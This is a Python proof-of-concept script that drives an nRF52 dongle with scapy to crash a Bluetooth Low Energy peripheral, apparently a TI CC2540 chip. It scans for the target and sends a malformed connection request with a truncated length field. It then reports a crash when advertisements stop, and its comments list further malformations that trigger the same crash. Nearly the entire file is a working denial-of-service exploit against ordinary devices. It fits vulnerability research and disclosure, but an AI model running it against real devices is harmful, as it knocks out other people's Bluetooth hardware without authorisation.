#!/usr/bin/python 
import os
import platform
import sys
from threading import Timer
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/')  # If the user runs this on previous path
sys.path.insert(0, os.getcwd() + '/libs')  # If the user runs this on previous path
sys.path.insert(0, os.getcwd() + '/../libs')
sys.path.insert(0, os.getcwd() + '/../')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *

none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False


def send(scapy_pkt, print_tx=True):
    driver.send(scapy_pkt)
    if print_tx:
        print(Fore.CYAN + "TX ---> " + scapy_pkt.summary()[7:])


# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].lower()
else:
    advertiser_address = '38:81:d7:3d:45:a2'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    driver.save_pcap()
    exit(0)


def scan_timeout():
    if not slave_connected:
        scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)
        send(scan_req)

    timeout_scan = Timer(5, scan_timeout)
    timeout_scan.daemon = True
    timeout_scan.start()


# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='CC2540_connection_req_crash.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
send(scan_req)

# Start the scan timeout to resend packets
timeout_scan = Timer(5, scan_timeout)
timeout_scan.daemon = True
timeout_scan.start()

timeout = Timer(5.0, crash_timeout)
timeout.daemon = True
timeout.start()
c = False
print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif slave_connected and BTLE_EMPTY_PDU not in pkt:
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt:
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
            timeout.cancel()
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=1) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=2,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms
                # ---------------------28 Bytes until here--------------------------
                # Truncated when sending over the air, but the initiator will try the following:
                chM=0x0000000001,
                hop=5,  # any, including 0
                SCA=0,  # Clock tolerance
            )
            # This means that the initiator will send the anchor point (Empty PDU) on channel 1 and stay there for every connection event)
            conn_request[BTLE_ADV].Length = 26  # Truncated, but CRC will be correct when sending over the air
            # conn_request[BTLE_CONNECT_REQ].interval=0 # Clearing the interval time triggers the crash.
            # conn_request[BTLE_ADV].timeout=0 # Clearing the supervision timeout triggers the crash.
            # conn_request[BTLE_ADV].Length=247 # Lowering the length also trigger the crash in CC2540.

            # chM=0x1FFFFFFFFF,

            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            send(conn_request)
            print(Fore.YELLOW + 'Malformed connection request was sent')

            # Start the timeout to detect crashes
            timeout = Timer(5.0, crash_timeout)
            timeout.daemon = True
            timeout.start()

    sleep(0.01)
